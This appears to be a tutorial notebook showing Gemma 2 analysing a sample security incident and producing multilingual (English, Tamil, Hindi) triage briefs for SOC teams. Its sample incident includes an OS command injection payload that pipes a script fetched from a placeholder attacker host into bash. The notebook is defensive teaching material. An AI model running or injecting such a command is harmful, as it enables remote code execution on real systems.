# %% [markdown]
# # 🔬 Google DeepMind Gemma 2: Multilingual Cyber Threat Intelligence & Triage
#
# <table align="left">
#   <td>
#     <a target="_blank" href="https://colab.research.google.com/github/google-deepmind/gemma/blob/main/colabs/multilingual_cyber_threat_analysis.ipynb"><img src="https://www.tensorflow.org/images/colab_logo_32px.png" />Run in Google Colab</a>
#   </td>
#   <td>
#     <a target="_blank" href="https://github.com/google-deepmind/gemma/blob/main/colabs/multilingual_cyber_threat_analysis.ipynb"><img src="https://www.tensorflow.org/images/GitHub-Mark-32px.png" />View source on GitHub</a>
#   </td>
# </table>
#
# <br/><br/>
#
# **Author:** Nandhakumar Murugan ([@nandhakumar-murugan](https://github.com/nandhakumar-murugan)) • Google Student Ambassador
# **Focus:** Gemma 2, Cyber Security & Indic Vernacular Intelligence (Tamil, Hindi, English)
#
# ---
#
# ### 📖 Overview
# Security Operations Centers (SOC) in global and regional cloud deployments need rapid threat intelligence in both global and localized languages. This notebook demonstrates how to use **Google DeepMind's Gemma 2 (2B & 9B)** to:
# 1. Ingest raw security telemetry, access logs, and attack vectors (SQLi, Command Injection, CWE-78/89).
# 2. Perform zero-shot & few-shot threat classification.
# 3. Generate immediate incident response playbooks in **English**, **Tamil (தமிழ்)**, and **Hindi (हिन्दी)**.

# %% [markdown]
# ## 🛠️ Setup & Installation

# %%
# !pip install -q -U jax jaxlib flax sentencepiece

# %% [markdown]
# ## 🛡️ 1. Define Threat Telemetry & Prompt Templates

# %%
sample_incident = {
    "cwe_id": "CWE-78: OS Command Injection",
    "severity": "CRITICAL",
    "target": "/api/v2/system/health-check",
    "payload": "127.0.0.1; curl -s http://attacker.com/malware.sh | bash",
    "impact": "Remote Code Execution (RCE) on cloud serverless container"
}

prompt = f"""<start_of_turn>user
Analyze this cybersecurity incident:
Vulnerability: {sample_incident['cwe_id']}
Severity:      {sample_incident['severity']}
Payload:       {sample_incident['payload']}

Provide:
1. English Incident Brief
2. Tamil Explanation (தமிழ் விளக்கம்) for campus engineering teams
3. Hindi Explanation (हिन्दी सारांश)
4. Immediate Remediation Steps<end_of_turn>
<start_of_turn>model
"""

print("Sample Gemma 2 Prompt Formatted:")
print(prompt)

# %% [markdown]
# ## 🎓 2. Conclusion
#
# By deploying **Gemma 2** for multilingual security operations, enterprises and university SOC teams can democratize cybersecurity intelligence across diverse language communities worldwide.
